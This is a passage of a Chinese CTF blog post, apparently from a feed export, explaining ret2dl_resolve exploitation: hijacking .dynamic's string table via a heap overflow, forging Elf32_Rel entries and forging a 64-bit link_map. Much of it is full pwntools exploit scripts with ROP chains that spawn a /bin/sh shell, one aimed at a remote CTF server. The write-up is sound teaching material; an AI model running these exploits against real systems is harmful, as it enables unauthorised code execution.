class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( number &gt; <span class="number">32</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  v3 = (note *)<span class="built_in">calloc</span>(<span class="number">0x10</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3-&gt;buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1u</span>LL); <span class="comment">//堆中存放了指针，所以可以通过这个任意写</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3-&gt;buf )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);</span><br><span class="line">  v3-&gt;size = size;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; notes[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  notes[i] = v3;</span><br><span class="line">  ++number;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以呢，可以先add两个note，然后编辑第一个note使得堆溢出到第二个note的指针，然后再修改第二个note，实现任意写。至于写什么，刚刚也说了，先写.dynamic指向字符串表的指针，使其指向一块可写内存，比如.bss，然后再写这块内存，使得相应偏移出刚好有个system\x00。exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">g_local=<span class="keyword">True</span></span><br><span class="line"><span class="comment">#e=ELF('./libc.so.6')</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">    sh =process(<span class="string">'./RNote4'</span>)<span class="comment">#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">"rnote4.2018.teamrois.cn"</span>, <span class="number">6767</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x01"</span>)</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> idx &lt; <span class="number">32</span> <span class="keyword">and</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x02"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> idx &lt; <span class="number">32</span></span><br><span class="line">    sh.send(<span class="string">"\x03"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#伪造的字符串表，(0x457-0x3f8)刚好是"free\x00"字符串的偏移</span></span><br><span class="line">payload = <span class="string">"C"</span> * (<span class="number">0x457</span><span class="number">-0x3f8</span>) + <span class="string">"system\x00"</span></span><br><span class="line"><span class="comment">#先新建两个notes</span></span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"B"</span> * <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#溢出时尽量保证堆块不被破坏，不过这里不会再做堆的操作了其实也无所谓</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x601EB0</span>))</span><br><span class="line"><span class="comment">#将0x601EB0，即.dynamic的字符串表指针，写成0x6020C8</span></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x6020C8</span>))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x6020C8</span>))</span><br><span class="line"><span class="comment">#在0x6020C8处写入伪造的字符串表</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#会第一次调用free，所以实际上是system("/bin/sh")被调用，如前面所说</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="伪造Elf32-Rel"><a href="#伪造Elf32-Rel" class="headerlink" title="伪造Elf32_Rel"></a>伪造Elf32_Rel</h3><p>通过操纵第二个参数，使其指向我们所构造的Elf32_Rel</p><p>当.dynamic不可写时，那么以上方法就没用了，所以有第二种利用方法<br> 上面我们讲完了函数的解析流程 主要是由dl_runtime_resolve(link_map,rel_offset),之所以它能解析不同函数的地址，以为我们传入的rel_offset不同，因此，把传入的rel_offset改为我们希望的函数的偏移，便可以执行我们希望的函数，新的问题来了，.rel.plt中不一定存在我们希望的函数，因此就需要我们伪造一个.rel.plt，将rel_offset修改为一个比较大的值，在.rel.plt+rel_offset的地方是我们伪造好的，结构跟.rel.plt相同的数据，这样我们就相当于伪造好了reloc（重定位入口），程序又会根据r_info找到对应的.dynsym中的symbols，我们再次伪造symbols的内容-&gt;st_name,使得到的str在我们的可控地址内，然后在.dynstr+st_name地址处放置库函数字符串例如：system。</p><p>所以，最终的利用思路，大概是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">0000000000400610</span> ; __unwind &#123;</span><br><span class="line">.plt:<span class="number">0000000000400610</span>                 push    cs:qword_602008</span><br><span class="line">.plt:<span class="number">0000000000400616</span>                 jmp     cs:qword_602010</span><br><span class="line">.plt:<span class="number">0000000000400616</span> sub_400610      endp</span><br></pre></td></tr></table></figure></p><p>构造ROP，跳转到resolve的PLT，push link_map的位置，就是上面所示的这个地方，也就是要调用_dl_runtime_resolve的地方,此时，栈中必须要有已经伪造好的指向伪造的Elf32_Rel的偏移</p><p>伪造一个很大的rel_offset，一直偏移到bss段（一般这里可读可写，且位于.rel.plt的高地址）</p><p>伪造Elf32_Rel即.rel.plt的结构,由RELSZ可知，它的大小为8字节（commend: readelf -d fun 可以看到），我们需要fake r_offset,以及r_info，r_offset一般是函数在.got.plt的地址，r_info可以用来计算在symtab中的index并且保存了类型，所以我们可以让伪造的symtab的数据紧跟在这段数据后面，这样我们就可以计算出它的index: index=(bss+0×100-.dynsym)/0×10(因为SYMENT指明大小为16字节)，类型必须为7，所以我们就可以计算出r_info的值<br>r_info=(index &lt;&lt; 8 ) | 0x7</p><p>伪造symtab，这一部分包含四个字段，我们只需要改st_name部分即可，其余部分按照程序原有的值赋值，st_name表示了字符串相对strtab的偏移，我们可以将字符串写在紧邻这一部分的高地址处</p><p>伪造strtab，这里我们直接将所需库函数的字符串写入即可，例如system<br>dl_runtime_resolve函数便会将system函数的地址，写到read函数对应的got表中去，再次调用read就相当于调用了system函数</p><p>利用思路如下:</p><p>第一次调用read函数，返回地址再溢出成read函数，这次参数给一个.bss的地址，里面放我们的payload，包括所有伪造的数据结构以及ROP。注意ROP要放在数据结构的前面，不然ROP调用时有可能污染我们伪造的数据结构，而且前面要预留一段空间给ROP所调用的函数用。调用完第二个read之后，ROP到leave; retn的地址，以便切栈切到在.bss中我们构造的下一个ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x2C</span> </span><br><span class="line">payload1 += p32(pop_ebp_ret) + p32(bss + <span class="number">0x800</span>) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_stage) + p32(<span class="number">0x1000</span>)</span><br><span class="line">sh.send(payload1)</span><br></pre></td></tr></table></figure><p>第二次调用read函数，此时要sendROP链以及所有相关的伪造数据结构完整的exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./fun'</span>)</span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080484ab</span></span><br><span class="line">leave_ret=<span class="number">0x08048378</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_stack_size=<span class="number">0x800</span></span><br><span class="line">bss=<span class="number">0x0804a01c</span></span><br><span class="line">read_plt=<span class="number">0x080482e0</span></span><br><span class="line">read_got=<span class="number">0x0804a00c</span></span><br><span class="line">bss_stage=bss+fake_stack_size</span><br><span class="line">dynsym=<span class="number">0x080481cc</span></span><br><span class="line">dynstr=<span class="number">0x0804821c</span></span><br><span class="line">dl_runtime_resolve=<span class="number">0x080482d0</span></span><br><span class="line">relplt=<span class="number">0x08048298</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rel_offset=bss_stage+<span class="number">28</span>-relplt</span><br><span class="line">fake_sym_addr=bss_stage+<span class="number">36</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>) <span class="comment">#为了16字节对齐</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'align==&gt;'</span>+hex(align)</span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line">index=(fake_sym_addr-dynsym)/<span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'index==&gt;'</span>+hex(index)</span><br><span class="line">r_info=(index&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'r_info==&gt;'</span>+hex(r_info)</span><br><span class="line"></span><br><span class="line">fake_raloc=p32(read_got)+p32(r_info)</span><br><span class="line">st_name=fake_sym_addr-dynstr+<span class="number">16</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x2C</span> </span><br><span class="line">payload1 += p32(pop_ebp_ret) + p32(bss + <span class="number">0x800</span>) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_stage) + p32(<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">binsh=<span class="string">'/bin/sh'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'aaaa'</span></span><br><span class="line">payload+=p32(dl_runtime_resolve)</span><br><span class="line">payload+=p32(rel_offset)</span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=p32(bss_stage+<span class="number">80</span>)</span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=fake_raloc</span><br><span class="line">payload+=<span class="string">'a'</span>*align</span><br><span class="line">payload+=fake_sym</span><br><span class="line">payload+=<span class="string">'system\0'</span></span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">80</span>-len(payload))</span><br><span class="line">payload+=binsh+<span class="string">'\x00'</span></span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">100</span>-len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="伪造link-map"><a href="#伪造link-map" class="headerlink" title="伪造link_map"></a>伪造link_map</h3><p>64位情况下，伪造rel.plt变得不可行，因为在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) </span><br><span class="line">  &#123; </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=(<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); </span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>; </span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx]; </span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>) </span><br><span class="line">      version = <span class="literal">NULL</span>; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里，出现了访问未映射的内存<br>主要是reloc-&gt;r_info过大的原因，因为我们在bss段伪造的数据，而bss段一般位于0x600000<br>然后真正的rel.plt位于0x400000内，导致过大。<br>如果我们在里0x400000处有可读写的区域，或许就可以成功 </p><p>因此，我们得另外想办法，那么得回过来看源代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        ...  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们到最外层的else里去，如果，我们伪造link_map，让sym-&gt;st_value为某个已经解析了的函数的地址,比如read，让l-&gt;l_addr为我们需要的函数(system)到read的偏移,这样,l-&gt;l_addr + sym-&gt;st_value就是我们需要的函数地址</p><p>如果，我们把read_got – 0x8处开始当成sym，那么sym-&gt;st_value就是read的地址，并且sym-&gt;st_other正好也不为0，绕过了if，一举两得</p><p>为了伪造link_map，我们需要知道link_map的结构，在glibc/include/link.h文件里，link_map结构比较复杂，但是，我们只需伪造需要用到的数据即可,</p><p>以jiavis oj level3_x64为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(<span class="string">'./level3_x64'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'b*0x400618')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct            </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="string">      unsigned char    st_info;    /* Symbol type and binding */        </span></span><br><span class="line"><span class="string">      unsigned char st_other;        /* Symbol visibility */              </span></span><br><span class="line"><span class="string">      Elf64_Section    st_shndx;    /* Section index */                  </span></span><br><span class="line"><span class="string">      Elf64_Addr    st_value;        /* Symbol value */                   </span></span><br><span class="line"><span class="string">      Elf64_Xword    st_size;        /* Symbol size */                    </span></span><br><span class="line"><span class="string">&#125;Elf64_Sym;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct           </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Addr    r_offset;        /* Address */                         </span></span><br><span class="line"><span class="string">  Elf64_Xword    r_info;            /* Relocation type and symbol index */</span></span><br><span class="line"><span class="string">  Elf64_Sxword    r_addend;        /* Addend */                          </span></span><br><span class="line"><span class="string">&#125;Elf64_Rela;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct          </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Sxword    d_tag;            /* Dynamic entry type */</span></span><br><span class="line"><span class="string">  union</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line"><span class="string">      Elf64_Addr d_ptr;            /* Address value */</span></span><br><span class="line"><span class="string">    &#125; d_un;</span></span><br><span class="line"><span class="string">&#125;Elf64_Dyn;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"> </span><br><span class="line">universal_gadget1 = <span class="number">0x4006AA</span></span><br><span class="line">universal_gadget2 = <span class="number">0x400690</span></span><br><span class="line"> </span><br><span class="line">Elf64_Sym_len = <span class="number">0x18</span></span><br><span class="line">Elf64_Rela_len = <span class="number">0x18</span></span><br><span class="line">write_addr = <span class="number">0x600ad0</span></span><br><span class="line">link_map_addr = write_addr+<span class="number">0x18</span></span><br><span class="line">rbp = write_addr<span class="number">-8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">leave = <span class="number">0x400618</span></span><br><span class="line">main = <span class="number">0x4005E6</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_STR_addr = l+0x68  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_SYM_addr = l+0x70  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_JMPREL_addr = l+0xf8</span></span><br><span class="line"> </span><br><span class="line">l_addr = libc.sym[<span class="string">'system'</span>] - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="comment">#l-&gt;l_addr + sym-&gt;st_value</span></span><br><span class="line"><span class="comment"># value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_link_map_gen</span><span class="params">(link_map_addr,l_addr,st_value)</span>:</span></span><br><span class="line">    fake_Elf64_Dyn_JMPREL_addr = link_map_addr + <span class="number">0x18</span></span><br><span class="line">    fake_Elf64_Dyn_SYM_addr = link_map_addr + <span class="number">8</span></span><br><span class="line">    fake_Elf64_Dyn_STR_addr = link_map_addr</span><br><span class="line">    fake_Elf64_Dyn_JMPREL = p64(<span class="number">0</span>) + p64(link_map_addr+<span class="number">0x28</span>)</span><br><span class="line">    fake_Elf64_Dyn_SYM = p64(<span class="number">0</span>) + p64(st_value<span class="number">-8</span>)</span><br><span class="line">    fake_Elf64_rela = p64(link_map_addr - l_addr) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    fake_link_map = p64(l_addr)            <span class="comment">#0x8</span></span><br><span class="line">    fake_link_map += fake_Elf64_Dyn_SYM    <span class="comment">#0x10</span></span><br><span class="line">    fake_link_map += fake_Elf64_Dyn_JMPREL <span class="comment">#0x10</span></span><br><span class="line">    fake_link_map += fake_Elf64_rela       <span class="comment">#0x18</span></span><br><span class="line">    fake_link_map += <span class="string">'\x00'</span>*<span class="number">0x28</span></span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_STR_addr) <span class="comment">#link_map_addr + 0x68</span></span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_SYM_addr) <span class="comment">#link_map_addr + 0x70</span></span><br><span class="line">    fake_link_map += <span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_JMPREL_addr)</span><br><span class="line">    <span class="keyword">return</span> fake_link_map</span><br><span class="line">fake_link_map = fake_link_map_gen(link_map_addr,l_addr,elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span></span><br><span class="line">payload += p64(rbp)</span><br><span class="line">payload += p64(universal_gadget1)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment">#pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)  <span class="comment">#pop rbp</span></span><br><span class="line">payload += p64(elf.got[<span class="string">'read'</span>])  <span class="comment">#pop r12</span></span><br><span class="line">payload += p64(len(fake_link_map)+<span class="number">0x18</span>) <span class="comment">#pop r13</span></span><br><span class="line">payload += p64(write_addr)  <span class="comment">#pop r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment">#pop r15</span></span><br><span class="line">payload += p64(universal_gadget2)  <span class="comment">#ret</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(main)</span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">'Input:\n'</span>,payload.ljust(<span class="number">0x200</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">fake_info = p64(<span class="number">0x4004A6</span>)        <span class="comment">#jmp</span></span><br><span class="line">fake_info += p64(link_map_addr)</span><br><span class="line">fake_info += p64(<span class="number">0</span>)</span><br><span class="line">fake_info += fake_link_map</span><br><span class="line">p.send(fake_info)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span>+p64(rbp)+p64(pop_rdi_ret)+p64(link_map_addr+<span class="number">0x78</span>)+p64(leave)</span><br><span class="line"><span class="comment">#stack pivot,进入函数重定向</span></span><br><span class="line">p.sendafter(<span class="string">'Input:\n'</span>,payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考链接:&lt;br&gt;&lt;a href=&quot;https://www.freebuf.com/articles/system/170661.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/articles/sy
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
